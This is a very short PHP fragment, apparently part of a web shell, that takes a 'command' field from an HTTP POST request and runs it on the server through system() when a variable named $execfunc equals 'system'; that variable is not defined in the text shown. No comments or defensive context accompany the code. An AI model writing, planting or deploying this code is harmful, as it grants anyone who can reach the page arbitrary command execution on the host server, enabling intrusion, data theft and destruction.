<?php
if (!empty($_POST['command'])) {
	if ($execfunc=="system") {
		system($_POST['command']);
	}
}
?>